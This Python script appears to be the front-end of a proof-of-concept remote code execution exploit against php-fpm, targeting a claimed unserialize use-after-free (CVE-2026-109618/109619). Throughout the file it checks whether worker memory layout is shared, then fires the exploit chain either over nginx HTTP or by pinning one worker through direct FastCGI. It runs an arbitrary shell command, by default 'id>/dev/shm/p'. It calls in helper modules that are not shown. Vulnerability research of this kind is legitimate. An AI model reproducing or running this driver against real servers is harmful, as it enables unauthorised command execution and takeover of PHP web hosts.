#!/usr/bin/env python3
# INDEX: scatter-safe front-end, pins worker on fallback | fpm | pure | serialize+unserialize | free | scatter or fcgi-pin
"""Multi-worker-safe front-end for the php-fpm unserialize-UAF RCE.
CVE-2026-109618 / CVE-2026-109619.

Makes the "is this pool scatter-safe?" check a hard gate. On stock php-fpm the
chain is worker-invariant (binbase + 2 MiB chunk base + spray slot are
fork-shared and reset to the post-RINIT baseline each request), so firing over
nginx HTTP and letting requests round-robin (scatter) works; if an invariance
preflight fails, the driver falls back to pinning one worker over direct
FastCGI, reducing the pool to the single-worker case. Composes the multiworker
and echo-route drivers read-only. Pure stdlib, safe under python3 -I.
Lab/analysis use only.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import sys
from urllib.parse import urlsplit

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(_HERE)  # poc/


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    if not os.path.exists(path):
        path = os.path.join(_POC_ROOT, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    for _p in (_HERE, _POC_ROOT):
        if _p not in sys.path:
            sys.path.insert(0, _p)
    spec.loader.exec_module(mod)
    return mod


def run(host, port, path, cmd, variant="8.4", samples=16,
        fcgi_host=None, fcgi_port=None, force=None, tries=12, attempts=6,
        verbose=True):
    """Gate on invariance, then scatter or pin. ``force`` ('scatter'|'pin')
    skips the gate. Returns the chosen route's result dict with ['route'] set."""
    mw = _load("fpm_fullchain_multiworker", "fpm_fullchain_multiworker.py")

    route = force
    inv = None
    if route is None:
        print("=" * 64)
        print("[pool] invariance preflight (is this pool scatter-safe?)")
        inv = mw.invariance_preflight(host, port, path, samples=samples,
                                      verbose=verbose)
        if inv.get("ok"):
            route = "scatter"
        else:
            route = "pin"
            print("[pool] NOT worker-invariant -> falling back to PIN "
                  "(direct FastCGI, one worker).")
            if not (fcgi_host and fcgi_port):
                return {"ok": False, "route": "pin", "invariance": inv,
                        "error": "pin fallback needs --fcgi-host/--fcgi-port "
                                 "(nginx keepalive does NOT pin; it round-robins)"}

    if route == "scatter":
        erd = _load("fpm_echo_route_driver", "fpm_echo_route_driver.py")
        print("=" * 64)
        print(f"[pool] SCATTER over http://{host}:{port}{path} (variant {variant})")
        r = erd.echo_route(host, port, path, cmd, variant=variant,
                           tries=tries, attempts=attempts, verbose=verbose)
        r["route"] = "scatter"
        r["invariance"] = inv
        return r

    # pin
    print("=" * 64)
    print(f"[pool] PIN over FastCGI {fcgi_host}:{fcgi_port}{path}")
    r = mw.run_pin(fcgi_host, fcgi_port, path, cmd, tries=tries,
                   attempts=attempts, verbose=verbose)
    r["route"] = "pin"
    r["invariance"] = inv
    return r


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--url", default="http://127.0.0.1:8191/remote_app.php",
                    help="nginx echo-sink URL (scatter)")
    ap.add_argument("--variant", choices=["8.4", "8.5"], default="8.4")
    ap.add_argument("--cmd", default="id>/dev/shm/p")
    ap.add_argument("--fcgi-host", default=None, help="php-fpm host (pin fallback)")
    ap.add_argument("--fcgi-port", type=int, default=None,
                    help="php-fpm port (pin fallback, direct FastCGI)")
    ap.add_argument("--force", choices=["scatter", "pin"], default=None,
                    help="skip the gate and force a route")
    ap.add_argument("--samples", type=int, default=16)
    ap.add_argument("--tries", type=int, default=12)
    ap.add_argument("--attempts", type=int, default=6)
    args = ap.parse_args(argv)

    u = urlsplit(args.url if "://" in args.url else "http://" + args.url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path if u.path and u.path.endswith(".php") else "/remote_app.php"

    r = run(host, port, path, args.cmd, variant=args.variant,
            samples=args.samples, fcgi_host=args.fcgi_host,
            fcgi_port=args.fcgi_port, force=args.force,
            tries=args.tries, attempts=args.attempts)
    print("=" * 64)
    print(f"[pool] route={r.get('route')} ok={r.get('ok')} "
          f"binbase={hex(r['binbase']) if r.get('binbase') else None}")
    if r.get("error"):
        print(f"[pool] {r['error']}")
    print("[pool] verify out of band (the fire SIGSEGVs after system()).")
    return 0 if r.get("ok") or r.get("route") == "scatter" else 1


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
